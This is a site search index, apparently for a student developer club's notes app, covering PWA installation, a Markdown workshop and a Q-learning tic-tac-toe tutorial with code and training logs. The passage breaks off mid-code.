{"config":{"lang":["en"],"separator":"[\\s\\-,:!=\\[\\]()\"/]+|(?!\\b)(?=[A-Z][a-z])|\\.(?!\\d)|&[lg]t;","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome!","text":"<p>Hi there, welcome to GDSC\u2019s app! You can install the app right now, by clicking <code>Add to Home Screen</code>. Check out the Installation Guide if you are facing difficulties.</p> <p>Make sure to \u2b50 this project on GitHub. Feel free to share this to everyone you know.</p> <p>Use the navbar \u2b05\ufe0f to go through the website.</p>"},{"location":"#installation-guide","title":"Installation Guide","text":"<p>What you\u2019re currently using is a PWA, which dramatically simplifies this entire notes initiative, but is not supported on a few browsers.</p> Platform Browser \u27a1 Supported?<sup>1</sup> Installation Step Android Chrome \u2705 Click the <code>Add to Home Screen</code> popup iOS Chrome \u274c \ud83d\ude15 I hate this; open the link on Safari Safari \u2705 Click the <code>Add to Home Screen</code> popup Windows Chrome \u2705 Click the <code>+</code> icon in the address bar Microsoft Edge \u2705 Click the <code>+</code> icon in the address bar MacOS Chrome \u2705 Click the <code>+</code> icon in the address bar Safari \u274c \ud83d\ude15 I hate this; open the link on Chrome Linux Chrome \u2705 Click the <code>+</code> icon in the address bar"},{"location":"#whats-a-pwa","title":"What\u2019s a PWA?","text":"<p>Progressive Web Apps are web applications that have been designed to be capable, reliable, and installable with a single codebase.</p> <p>Using a PWA in this case allows the contributors of the website and I to ensure legible and understandable content, without worrying about the app development.</p> <p>For more details, check out Google\u2019s blog post</p> <ol> <li> <p>caniuse.com \u21a9</p> </li> </ol>"},{"location":"2022-2023/02_Markdown/","title":"Introduction to Markdown","text":"<p>Hi there! In this workshop, we will be covering the basics of notetaking and how to efficiently take digital notes using Markdown format.</p> <p>(PS: This document was written with Markdown \u2764)</p> <p>Organized by Ahmed Thahir</p>"},{"location":"2022-2023/02_Markdown/#recording","title":"Recording","text":"<p>Watch the Recording</p>"},{"location":"2022-2023/02_Markdown/#usage","title":"Usage","text":"<p>We will be using open-source editor Marktext for this workshop. You may download the latest version from its Releases Page.</p>"},{"location":"2022-2023/02_Markdown/#notetaking","title":"Notetaking","text":""},{"location":"2022-2023/02_Markdown/#definition","title":"Definition","text":"<p>Note-taking is the practice of recording information from different sources and platforms. By taking notes, the writer records the essence of the information, freeing their mind from having to recall everything.</p>"},{"location":"2022-2023/02_Markdown/#purpose","title":"Purpose","text":"<p>Notetaking allows us to capture information and help make sense of it. Our current world has so much information out there that it can be hard to store all that in our memory.</p> <p>Notetaking helps eliminate the clutter and focus on what is important.</p>"},{"location":"2022-2023/02_Markdown/#markdown","title":"Markdown","text":"<p>Markdown is a lightweight markup language for creating formatted text using a plain-text editor \u2026 a markup language that is appealing to human readers in its source code form. Markdown is widely used in blogging, instant messaging, online forums, collaborative software, documentation pages, and readme files.</p> <ul> <li>Markdown allows notetakers to collect and store notes in plain-text</li> <li>It allows to avoid proprietary software, by taking notes in an open-source format</li> <li>It allows to focus on the content, as</li> <li>the content is separated from the styling settings</li> <li>notetaker does not use buttons, but rather uses <code>#, ##, -</code> to denote different headers, sub-headers, lists, etc.</li> </ul>"},{"location":"2022-2023/02_Markdown/#headers","title":"Headers","text":"<pre><code># Header 1\n## Header 2\n### Header 3\n#### Header 4\n##### Header 5\n###### Header 6\n\nParagraph\n</code></pre>"},{"location":"2022-2023/02_Markdown/#emphasis","title":"Emphasis","text":"<pre><code>*This text will be italic*\n_This will also be italic_\n**This text will be bold**\n__This will also be bold__\n*You **can** combine them*\n</code></pre> <p>This text will be italic</p> <p>This will also be italic</p> <p>This text will be bold</p> <p>This will also be bold</p> <p>You can combine them</p>"},{"location":"2022-2023/02_Markdown/#lists","title":"Lists","text":""},{"location":"2022-2023/02_Markdown/#unordered","title":"Unordered","text":"<pre><code>- Item 1\n- Item 2\n  - Item 2a\n  - Item 2b\n\n(or)\n\n* Item 1\n* Item 2\n  * Item 2a\n  * Item 2b\n</code></pre> <ul> <li>Item 1</li> <li>Item 2</li> <li>Item 2a</li> <li>Item 2b</li> </ul>"},{"location":"2022-2023/02_Markdown/#ordered","title":"Ordered","text":"<pre><code>1. Item 1\n2. Item 2\n3. Item 3\n    1. Item 3a\n    2. Item 3b\n</code></pre> <ol> <li>Item 1</li> <li>Item 2</li> <li>Item 3<ol> <li>Item 3a</li> <li>Item 3b</li> </ol> </li> </ol>"},{"location":"2022-2023/02_Markdown/#tasks","title":"Tasks","text":"<pre><code>- [x] Completed item\n- [ ] Incomplete item\n</code></pre> <ul> <li> Completed item</li> <li> Incomplete item</li> </ul>"},{"location":"2022-2023/02_Markdown/#images","title":"Images","text":"<pre><code>![Alt Text](url)\n\nLocal Image\n![GitHub Logo](logo.png)\n\nWeb Image\n![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Logo.png)\n</code></pre>"},{"location":"2022-2023/02_Markdown/#links","title":"Links","text":"<pre><code>Unlabelled Links\nhttp://github.com - automatic!\n\nLabelled Links\n[GitHub](http://github.com)\n</code></pre> <p>GitHub</p>"},{"location":"2022-2023/02_Markdown/#code-fences","title":"Code Fences","text":"<pre><code>```python\nprint(\"Hello World\")\n```\n</code></pre> <pre><code>print(\"Hello World\")\n</code></pre>"},{"location":"2022-2023/02_Markdown/#tables","title":"Tables","text":"<pre><code>|       | Column 1 | Column 2 |\n| ----- | -------- | -------- |\n| Row 1 |          |          |\n| Row 2 |          |          |\n</code></pre> Column 1 Column 2 Row 1 Row 2"},{"location":"2022-2023/02_Markdown/#diagrams","title":"Diagrams","text":"<pre><code>flowchart LR\na --&gt; b &amp; c -.-&gt; d\n</code></pre> <pre><code>flowchart LR\na --&gt; b &amp; c -.-&gt; d</code></pre>"},{"location":"2022-2023/02_Markdown/#math","title":"Math","text":"<pre><code>This is inline $x^2$\n\nThis is a block equation\n\n$$\n\\int_0^\\infty x^2\n$$\n</code></pre> <p>This is inline \\(x^2\\)</p> <p>This is a block equation</p> \\[ \\int_0^\\infty x^2 \\]"},{"location":"2022-2023/05_Q_Learning/","title":"Introduction to Q-Learning","text":"In\u00a0[\u00a0]: Copied! <pre># Installing the required libraries\n!pip install kaggle_environments tqdm\n!pip install vec_noise\n!pip install pettingzoo\n! pip install pygame\n</pre> # Installing the required libraries !pip install kaggle_environments tqdm !pip install vec_noise !pip install pettingzoo ! pip install pygame <pre>Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\nCollecting kaggle_environments\n  Downloading kaggle_environments-1.10.3-py2.py3-none-any.whl (1.3 MB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 1.3 MB 8.3 MB/s \nRequirement already satisfied: tqdm in /usr/local/lib/python3.7/dist-packages (4.64.1)\nRequirement already satisfied: numpy&gt;=1.19.5 in /usr/local/lib/python3.7/dist-packages (from kaggle_environments) (1.21.6)\nRequirement already satisfied: jsonschema&gt;=3.0.1 in /usr/local/lib/python3.7/dist-packages (from kaggle_environments) (4.3.3)\nRequirement already satisfied: Flask&gt;=1.1.2 in /usr/local/lib/python3.7/dist-packages (from kaggle_environments) (1.1.4)\nCollecting requests&gt;=2.25.1\n  Downloading requests-2.28.1-py3-none-any.whl (62 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 62 kB 576 kB/s \nRequirement already satisfied: click&lt;8.0,&gt;=5.1 in /usr/local/lib/python3.7/dist-packages (from Flask&gt;=1.1.2-&gt;kaggle_environments) (7.1.2)\nRequirement already satisfied: itsdangerous&lt;2.0,&gt;=0.24 in /usr/local/lib/python3.7/dist-packages (from Flask&gt;=1.1.2-&gt;kaggle_environments) (1.1.0)\nRequirement already satisfied: Werkzeug&lt;2.0,&gt;=0.15 in /usr/local/lib/python3.7/dist-packages (from Flask&gt;=1.1.2-&gt;kaggle_environments) (1.0.1)\nRequirement already satisfied: Jinja2&lt;3.0,&gt;=2.10.1 in /usr/local/lib/python3.7/dist-packages (from Flask&gt;=1.1.2-&gt;kaggle_environments) (2.11.3)\nRequirement already satisfied: MarkupSafe&gt;=0.23 in /usr/local/lib/python3.7/dist-packages (from Jinja2&lt;3.0,&gt;=2.10.1-&gt;Flask&gt;=1.1.2-&gt;kaggle_environments) (2.0.1)\nRequirement already satisfied: attrs&gt;=17.4.0 in /usr/local/lib/python3.7/dist-packages (from jsonschema&gt;=3.0.1-&gt;kaggle_environments) (22.1.0)\nRequirement already satisfied: typing-extensions in /usr/local/lib/python3.7/dist-packages (from jsonschema&gt;=3.0.1-&gt;kaggle_environments) (4.1.1)\nRequirement already satisfied: pyrsistent!=0.17.0,!=0.17.1,!=0.17.2,&gt;=0.14.0 in /usr/local/lib/python3.7/dist-packages (from jsonschema&gt;=3.0.1-&gt;kaggle_environments) (0.19.2)\nRequirement already satisfied: importlib-resources&gt;=1.4.0 in /usr/local/lib/python3.7/dist-packages (from jsonschema&gt;=3.0.1-&gt;kaggle_environments) (5.10.0)\nRequirement already satisfied: importlib-metadata in /usr/local/lib/python3.7/dist-packages (from jsonschema&gt;=3.0.1-&gt;kaggle_environments) (4.13.0)\nRequirement already satisfied: zipp&gt;=3.1.0 in /usr/local/lib/python3.7/dist-packages (from importlib-resources&gt;=1.4.0-&gt;jsonschema&gt;=3.0.1-&gt;kaggle_environments) (3.10.0)\nRequirement already satisfied: idna&lt;4,&gt;=2.5 in /usr/local/lib/python3.7/dist-packages (from requests&gt;=2.25.1-&gt;kaggle_environments) (2.10)\nRequirement already satisfied: charset-normalizer&lt;3,&gt;=2 in /usr/local/lib/python3.7/dist-packages (from requests&gt;=2.25.1-&gt;kaggle_environments) (2.1.1)\nRequirement already satisfied: urllib3&lt;1.27,&gt;=1.21.1 in /usr/local/lib/python3.7/dist-packages (from requests&gt;=2.25.1-&gt;kaggle_environments) (1.24.3)\nRequirement already satisfied: certifi&gt;=2017.4.17 in /usr/local/lib/python3.7/dist-packages (from requests&gt;=2.25.1-&gt;kaggle_environments) (2022.9.24)\nInstalling collected packages: requests, kaggle-environments\n  Attempting uninstall: requests\n    Found existing installation: requests 2.23.0\n    Uninstalling requests-2.23.0:\n      Successfully uninstalled requests-2.23.0\nSuccessfully installed kaggle-environments-1.10.3 requests-2.28.1\nLooking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\nCollecting vec_noise\n  Downloading vec_noise-1.1.4.zip (134 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 134 kB 8.1 MB/s \nRequirement already satisfied: numpy in /usr/local/lib/python3.7/dist-packages (from vec_noise) (1.21.6)\nBuilding wheels for collected packages: vec-noise\n  Building wheel for vec-noise (setup.py) ... done\n  Created wheel for vec-noise: filename=vec_noise-1.1.4-cp37-cp37m-linux_x86_64.whl size=80743 sha256=b8498fcc6f3ec5b9163dc8c1ac2f5d562a563afb4fff943475eb644ba8af392e\n  Stored in directory: /root/.cache/pip/wheels/fc/0c/19/5932b4834cf3204ed2ae845e788f07c79b3279c302d55d6fa8\nSuccessfully built vec-noise\nInstalling collected packages: vec-noise\nSuccessfully installed vec-noise-1.1.4\nLooking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\nCollecting pettingzoo\n  Downloading PettingZoo-1.22.2-py3-none-any.whl (816 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 816 kB 7.9 MB/s \nCollecting gymnasium&gt;=0.26.0\n  Downloading Gymnasium-0.26.3-py3-none-any.whl (836 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 836 kB 33.1 MB/s \nRequirement already satisfied: numpy&gt;=1.18.0 in /usr/local/lib/python3.7/dist-packages (from pettingzoo) (1.21.6)\nRequirement already satisfied: importlib-metadata&gt;=4.8.0 in /usr/local/lib/python3.7/dist-packages (from gymnasium&gt;=0.26.0-&gt;pettingzoo) (4.13.0)\nCollecting gymnasium-notices&gt;=0.0.1\n  Downloading gymnasium_notices-0.0.1-py3-none-any.whl (2.8 kB)\nRequirement already satisfied: cloudpickle&gt;=1.2.0 in /usr/local/lib/python3.7/dist-packages (from gymnasium&gt;=0.26.0-&gt;pettingzoo) (1.5.0)\nRequirement already satisfied: zipp&gt;=0.5 in /usr/local/lib/python3.7/dist-packages (from importlib-metadata&gt;=4.8.0-&gt;gymnasium&gt;=0.26.0-&gt;pettingzoo) (3.10.0)\nRequirement already satisfied: typing-extensions&gt;=3.6.4 in /usr/local/lib/python3.7/dist-packages (from importlib-metadata&gt;=4.8.0-&gt;gymnasium&gt;=0.26.0-&gt;pettingzoo) (4.1.1)\nInstalling collected packages: gymnasium-notices, gymnasium, pettingzoo\nSuccessfully installed gymnasium-0.26.3 gymnasium-notices-0.0.1 pettingzoo-1.22.2\nLooking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\nCollecting pygame\n  Downloading pygame-2.1.2-cp37-cp37m-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (21.8 MB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 21.8 MB 82.2 MB/s \nInstalling collected packages: pygame\nSuccessfully installed pygame-2.1.2\n</pre> In\u00a0[\u00a0]: Copied! <pre>from kaggle_environments import make # Installs the Environment\nimport numpy as np # For fast computations\nimport matplotlib.pyplot as plt # To plot graphs\nfrom tqdm import tqdm # For progress bars\n</pre> from kaggle_environments import make # Installs the Environment import numpy as np # For fast computations import matplotlib.pyplot as plt # To plot graphs from tqdm import tqdm # For progress bars In\u00a0[\u00a0]: Copied! <pre>env = make(\"tictactoe\", debug = True) # Create the environment\n</pre> env = make(\"tictactoe\", debug = True) # Create the environment  In\u00a0[\u00a0]: Copied! <pre># View the required specifications of the environment\nprint(\"Observation Space :\", env.specification.observation['board'])\nprint(\"Action Space :\", env.specification.action)\nprint(\"Reward Space :\", env.specification.reward)\n</pre> # View the required specifications of the environment print(\"Observation Space :\", env.specification.observation['board']) print(\"Action Space :\", env.specification.action) print(\"Reward Space :\", env.specification.reward) <pre>Observation Space : {'description': 'Serialized 3x3 grid. 0 = Empty, 1 = X, 2 = O', 'type': 'array', 'shared': True, 'default': [0, 0, 0, 0, 0, 0, 0, 0, 0], 'minItems': 9, 'maxItems': 9}\nAction Space : {'description': 'Position to place a mark on the board.', 'type': 'integer', 'minimum': 0, 'maximum': 8, 'default': 0}\nReward Space : {'description': '-1 = Lost, 0 = Draw/Ongoing, 1 = Won', 'enum': [-1, 0, 1], 'default': 0, 'type': ['number', 'null']}\n</pre> In\u00a0[\u00a0]: Copied! <pre>env.reset() # Create a new game\nenv.run(['random', \"reaction\"]) # Run the random player against the reaction player\nenv.render(mode = \"ipython\")\n</pre> env.reset() # Create a new game env.run(['random', \"reaction\"]) # Run the random player against the reaction player env.render(mode = \"ipython\") <p>Below is a python class that implements q_learning for a tic-tac-toe game. This code will be almost the same for every problem you can take, the only difference would be how you decide which actions are invalid. For tic-tac-toe this is simply saying that we cannot put a piece on a space that is not blank. To prevent the model from taking such a move, we mark the q-value of this action as -1000.</p> In\u00a0[\u00a0]: Copied! <pre>class Agent:\n    def __init__(self, num_actions, epsilon = 0.5, decay = 0.995, alpha = 0.1, discount = 0.999999):\n        self.q_table = {} # This is the memory of the AI\n        \n        self.epsilon = epsilon # Probability of random action [0 - 1]\n        self.decay = decay # epsilon decay [0 - 1]\n        self.alpha = alpha # learning rate [0 - inf]\n        self.discount = discount # how much importance is given to future states [0 - 1]\n        self.num_actions = num_actions\n    \n    def get_action(self, obs): # look at the environmental and choose an action\n        obs = tuple(obs)\n        while True:\n\n            if obs not in self.q_table:\n                self.q_table[obs] = np.random.random(self.num_actions)\n\n            action = np.argmax(self.q_table[obs])\n\n            if np.random.random() &lt; self.epsilon:\n                action = np.random.randint(0, self.num_actions)\n            \n            if obs[action] != 0:\n                self.q_table[obs][action] = -1000\n                continue\n            # type is returned as &lt;class 'numpy.int64'&gt; by default, so we convert to int\n            return int(action)\n    \n    def update_q_table(self, obs, action, new_obs, reward):   \n        obs = tuple(obs)\n        new_obs = tuple(new_obs)\n        \n        max_future_q = self.get_max_future_q(new_obs)\n        \n        current_q = self.q_table[obs][action]\n        \n        current_reward = ((1 - self.alpha) * current_q)\n        future_reward = (self.alpha * (reward + self.discount * max_future_q))\n        self.q_table[obs][action] = current_reward + future_reward\n        \n    \n    def get_max_future_q(self, obs):\n        obs = tuple(obs)\n        if obs not in self.q_table:\n            self.q_table[obs] = np.random.random(self.num_actions)\n        \n        return np.max(self.q_table[obs])\n</pre> class Agent:     def __init__(self, num_actions, epsilon = 0.5, decay = 0.995, alpha = 0.1, discount = 0.999999):         self.q_table = {} # This is the memory of the AI                  self.epsilon = epsilon # Probability of random action [0 - 1]         self.decay = decay # epsilon decay [0 - 1]         self.alpha = alpha # learning rate [0 - inf]         self.discount = discount # how much importance is given to future states [0 - 1]         self.num_actions = num_actions          def get_action(self, obs): # look at the environmental and choose an action         obs = tuple(obs)         while True:              if obs not in self.q_table:                 self.q_table[obs] = np.random.random(self.num_actions)              action = np.argmax(self.q_table[obs])              if np.random.random() &lt; self.epsilon:                 action = np.random.randint(0, self.num_actions)                          if obs[action] != 0:                 self.q_table[obs][action] = -1000                 continue             # type is returned as  by default, so we convert to int             return int(action)          def update_q_table(self, obs, action, new_obs, reward):            obs = tuple(obs)         new_obs = tuple(new_obs)                  max_future_q = self.get_max_future_q(new_obs)                  current_q = self.q_table[obs][action]                  current_reward = ((1 - self.alpha) * current_q)         future_reward = (self.alpha * (reward + self.discount * max_future_q))         self.q_table[obs][action] = current_reward + future_reward                   def get_max_future_q(self, obs):         obs = tuple(obs)         if obs not in self.q_table:             self.q_table[obs] = np.random.random(self.num_actions)                  return np.max(self.q_table[obs]) <p>Below is python code that implements the training loop as described above.</p> <p>We use the kaggle environments for this training. Every action we take returns a new observation and reward which allows us to learn appropriately. Here we are training our AI by having it play 5000 games against the 'reaction' player.</p> In\u00a0[\u00a0]: Copied! <pre>env = make(\"tictactoe\", debug = True) # Create the environment \n\nagent = Agent(9) # Agent that can take one of nine possible actions\nepisodes = 5000 # Train for 5000 episodes\n\nshow_every = 100 # Display model progress every 100 episodes\n\ndeacy_after = 400 # Decay epsilon after some amount of iterations\n\n\ntrainer = env.train([None, \"reaction\"]) # train against 'reaction' or 'random' agent\nrewards = []\nepsilon_values = []\n</pre> env = make(\"tictactoe\", debug = True) # Create the environment   agent = Agent(9) # Agent that can take one of nine possible actions episodes = 5000 # Train for 5000 episodes  show_every = 100 # Display model progress every 100 episodes  deacy_after = 400 # Decay epsilon after some amount of iterations   trainer = env.train([None, \"reaction\"]) # train against 'reaction' or 'random' agent rewards = [] epsilon_values = [] In\u00a0[\u00a0]: Copied! <pre>for episode_no in range(episodes):\n    episode_reward = 0\n    \n    obs = trainer.reset() # Reset the board\n    done = False # Checks if the game has ended\n    while not done:\n        action = agent.get_action(obs['board']) # get an action from the agent\n        \n        past_board = obs['board'].copy()\n        \n        obs, reward, done, info = trainer.step(action) # Play the move and get the reward\n        episode_reward += reward\n        agent.update_q_table(past_board, action, obs['board'], reward) # Tells the AI to learn based on the reward\n        \n        if episode_no &gt;= deacy_after:\n            agent.epsilon *= agent.decay # Decay epsilon\n    \n    epsilon_values.append(agent.epsilon)\n    rewards.append(reward)\n    if episode_no % show_every == 0: # Display Results of Previous 100 Episodes\n        batch = list(rewards[-show_every:])\n        print(f\"{show_every} episode mean score is {np.mean(batch)}.\")\n        print(f\"Wins : {batch.count(1)}, Draws : {batch.count(0)}, Losses : {batch.count(-1)}\")\n</pre>  for episode_no in range(episodes):     episode_reward = 0          obs = trainer.reset() # Reset the board     done = False # Checks if the game has ended     while not done:         action = agent.get_action(obs['board']) # get an action from the agent                  past_board = obs['board'].copy()                  obs, reward, done, info = trainer.step(action) # Play the move and get the reward         episode_reward += reward         agent.update_q_table(past_board, action, obs['board'], reward) # Tells the AI to learn based on the reward                  if episode_no &gt;= deacy_after:             agent.epsilon *= agent.decay # Decay epsilon          epsilon_values.append(agent.epsilon)     rewards.append(reward)     if episode_no % show_every == 0: # Display Results of Previous 100 Episodes         batch = list(rewards[-show_every:])         print(f\"{show_every} episode mean score is {np.mean(batch)}.\")         print(f\"Wins : {batch.count(1)}, Draws : {batch.count(0)}, Losses : {batch.count(-1)}\") <pre>100 episode mean score is 0.33.\nWins : 35, Draws : 63, Losses : 2\n100 episode mean score is 0.34.\nWins : 35, Draws : 64, Losses : 1\n100 episode mean score is 0.4.\nWins : 41, Draws : 58, Losses : 1\n100 episode mean score is 0.37.\nWins : 38, Draws : 61, Losses : 1\n100 episode mean score is 0.4.\nWins : 40, Draws : 60, Losses : 0\n100 episode mean score is 0.46.\nWins : 46, Draws : 54, Losses : 0\n100 episode mean score is 0.43.\nWins : 44, Draws : 55, Losses : 1\n100 episode mean score is 0.41.\nWins : 41, Draws : 59, Losses : 0\n100 episode mean score is 0.34.\nWins : 35, Draws : 64, Losses : 1\n100 episode mean score is 0.47.\nWins : 48, Draws : 51, Losses : 1\n100 episode mean score is 0.34.\nWins : 34, Draws : 66, Losses : 0\n100 episode mean score is 0.33.\nWins : 33, Draws : 67, Losses : 0\n100 episode mean score is 0.39.\nWins : 39, Draws : 61, Losses : 0\n100 episode mean score is 0.36.\nWins : 36, Draws : 64, Losses : 0\n100 episode mean score is 0.37.\nWins : 37, Draws : 63, Losses : 0\n100 episode mean score is 0.48.\nWins : 48, Draws : 52, Losses : 0\n100 episode mean score is 0.38.\nWins : 38, Draws : 62, Losses : 0\n100 episode mean score is 0.4.\nWins : 40, Draws : 60, Losses : 0\n100 episode mean score is 0.44.\nWins : 44, Draws : 56, Losses : 0\n100 episode mean score is 0.37.\nWins : 37, Draws : 63, Losses : 0\n100 episode mean score is 0.48.\nWins : 48, Draws : 52, Losses : 0\n100 episode mean score is 0.38.\nWins : 38, Draws : 62, Losses : 0\n100 episode mean score is 0.48.\nWins : 48, Draws : 52, Losses : 0\n100 episode mean score is 0.4.\nWins : 40, Draws : 60, Losses : 0\n100 episode mean score is 0.4.\nWins : 40, Draws : 60, Losses : 0\n</pre> In\u00a0[\u00a0]: Copied! <pre># Plot the rewards per batch over time\n\nlist_progression = [rewards[i:i + show_every] for i in range(0, len(rewards), show_every)]\nlist_progression = [sum(i)/len(i) for i in list_progression]\nplt.plot(list_progression)\nplt.xlabel(\"Batch Number\")\nplt.ylabel(\"Agent Score\")\nplt.title(\"Agent Score Over time\")\nplt.show()\n</pre> # Plot the rewards per batch over time  list_progression = [rewards[i:i + show_every] for i in range(0, len(rewards), show_every)] list_progression = [sum(i)/len(i) for i in list_progression] plt.plot(list_progression) plt.xlabel(\"Batch Number\") plt.ylabel(\"Agent Score\") plt.title(\"Agent Score Over time\") plt.show() In\u00a0[\u00a0]: Copied! <pre># Plot the decay in epsilon over time\n\nplt.plot(range(len(epsilon_values)), epsilon_values)\nplt.xlabel(\"Episode Number\")\nplt.ylabel(\"Epsilon Value\")\nplt.title(\"Epsilon Decay While Training\")\nplt.show()\n</pre> # Plot the decay in epsilon over time  plt.plot(range(len(epsilon_values)), epsilon_values) plt.xlabel(\"Episode Number\") plt.ylabel(\"Epsilon Value\") plt.title(\"Epsilon Decay While Training\") plt.show() <p>Below we create a function that takes an observation and returns the action our AI would have taken. This is then passed into our environment's GUI.</p> In\u00a0[\u00a0]: Copied! <pre>def run_agent(obs): # Create a function to extract the board from the environment and get the coresponding action\n    return agent.get_action(obs[\"board\"])\n\n\nenv.reset()\nenv.run([run_agent, \"reaction\"]) # Run the AI against the inbuilt player\nenv.render(mode = \"ipython\")\n</pre> def run_agent(obs): # Create a function to extract the board from the environment and get the coresponding action     return agent.get_action(obs[\"board\"])   env.reset() env.run([run_agent, \"reaction\"]) # Run the AI against the inbuilt player env.render(mode = \"ipython\") <p>To do this we have implemented the game using python code. Below is a numpy optimized version of the reward function of the kaggle environment.</p> In\u00a0[\u00a0]: Copied! <pre># Create a Custom Rewards function\ndef get_reward(board, turn):\n    board = np.array(board).reshape((3, 3))\n    \n    # Row Check\n    if np.any(np.all(board == 1, axis = 1)):\n        if turn == 1:\n            return 1\n        else:\n            return -1\n    \n    # Column check\n    if np.any(np.all(board == 1, axis = 0)):\n        if turn == 1:\n            return 1\n        else:\n            return -1\n    \n    # Diagonals check\n    if board[0][0] == 1 and board[1][1] == 1 and board[2][2] == 1:\n        if turn == 1:\n            return 1\n        else:\n            return -1\n        \n    if board[0][2] == 1 and board[1][1] == 1 and board[2][0] == 1:\n        if turn == 1:\n            return 1\n        else:\n            return -1\n    \n    \n    # Row Check\n    if np.any(np.all(board == 2, axis = 1)):\n        if turn == 1:\n            return -1\n        else:\n            return 1\n    \n    # Column check\n    if np.any(np.all(board == 2, axis = 0)):\n        if turn == 1:\n            return -1\n        else:\n            return 1\n    \n    # Diagonals check\n    if board[0][0] == 2 and board[1][1] == 2 and board[2][2] == 2:\n        if turn == 1:\n            return -1\n        else:\n            return 1\n        \n    if board[0][2] == 2 and board[1][1] == 2 and board[2][0] == 2:\n        if turn == 1:\n            return -1\n        else:\n            return 1\n    \n    return 0\n</pre> # Create a Custom Rewards function def get_reward(board, turn):     board = np.array(board).reshape((3, 3))          # Row Check     if np.any(np.all(board == 1, axis = 1)):         if turn == 1:             return 1         else:             return -1          # Column check     if np.any(np.all(board == 1, axis = 0)):         if turn == 1:             return 1         else:             return -1          # Diagonals check     if board[0][0] == 1 and board[1][1] == 1 and board[2][2] == 1:         if turn == 1:             return 1         else:             return -1              if board[0][2] == 1 and board[1][1] == 1 and board[2][0] == 1:         if turn == 1:             return 1         else:             return -1               # Row Check     if np.any(np.all(board == 2, axis = 1)):         if turn == 1:             return -1         else:             return 1          # Column check     if np.any(np.all(board == 2, axis = 0)):         if turn == 1:             return -1         else:             return 1          # Diagonals check     if board[0][0] == 2 and board[1][1] == 2 and board[2][2] == 2:         if turn == 1:             return -1         else:             return 1              if board[0][2] == 2 and board[1][1] == 2 and board[2][0] == 2:         if turn == 1:             return -1         else:             return 1          return 0 <p>Below is the training loop with the two AI's pitted against each other.</p> In\u00a0[\u00a0]: Copied! <pre>agent1 = Agent(9, epsilon = 0.5, decay = 0.99999, alpha = 0.1, discount = 0.999999)\nagent2 = Agent(9, epsilon = 0.5, decay = 0.99999, alpha = 0.1, discount = 0.999999)\nepisodes = 50_000\n\ndeacy_after = 10_000 # Decay epsilon after some amount of iterations\n\nfor episode_no in tqdm(range(episodes)):\n    obs = np.zeros((9, ))\n    done = False # Checks if the game has ended\n    turn = 1 # Which player's turn it is\n    while not done:\n        if turn == 1:\n            action = agent1.get_action(obs) # get an action from the agent\n        else:\n            action = agent2.get_action(obs) # get an action from the agent\n        \n        past_board = obs.copy()\n        \n        obs[action] = turn\n        \n        reward = get_reward(obs, turn)\n        if reward != 0 or np.all(obs != 0):\n            done = True\n        \n        if turn == 1:\n            agent1.update_q_table(past_board, action, obs, reward) # Tells the AI to learn based on the reward\n            turn = 2\n        else:\n            agent2.update_q_table(past_board, action, obs, reward) # Tells the AI to learn based on the reward\n            turn = 1\n        \n    if episode_no &gt;= deacy_after:\n        agent1.epsilon *= agent1.decay # Decay epsilon\n        agent2.epsilon *= agent2.decay # Decay epsilon\n</pre> agent1 = Agent(9, epsilon = 0.5, decay = 0.99999, alpha = 0.1, discount = 0.999999) agent2 = Agent(9, epsilon = 0.5, decay = 0.99999, alpha = 0.1, discount = 0.999999) episodes = 50_000  deacy_after = 10_000 # Decay epsilon after some amount of iterations  for episode_no in tqdm(range(episodes)):     obs = np.zeros((9, ))     done = False # Checks if the game has ended     turn = 1 # Which player's turn it is     while not done:         if turn == 1:             action = agent1.get_action(obs) # get an action from the agent         else:             action = agent2.get_action(obs) # get an action from the agent                  past_board = obs.copy()                  obs[action] = turn                  reward = get_reward(obs, turn)         if reward != 0 or np.all(obs != 0):             done = True                  if turn == 1:             agent1.update_q_table(past_board, action, obs, reward) # Tells the AI to learn based on the reward             turn = 2         else:             agent2.update_q_table(past_board, action, obs, reward) # Tells the AI to learn based on the reward             turn = 1              if episode_no &gt;= deacy_after:         agent1.epsilon *= agent1.decay # Decay epsilon         agent2.epsilon *= agent2.decay # Decay epsilon <pre>100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 500000/500000 [05:04&lt;00:00, 1640.01it/s]\n</pre> In\u00a0[\u00a0]: Copied! <pre>def run_agent1(obs): # Create a function to extract the board from the environment and get the coresponding action\n    return agent1.get_action(obs[\"board\"])\ndef run_agent2(obs): # Create a function to extract the board from the environment and get the coresponding action\n    return 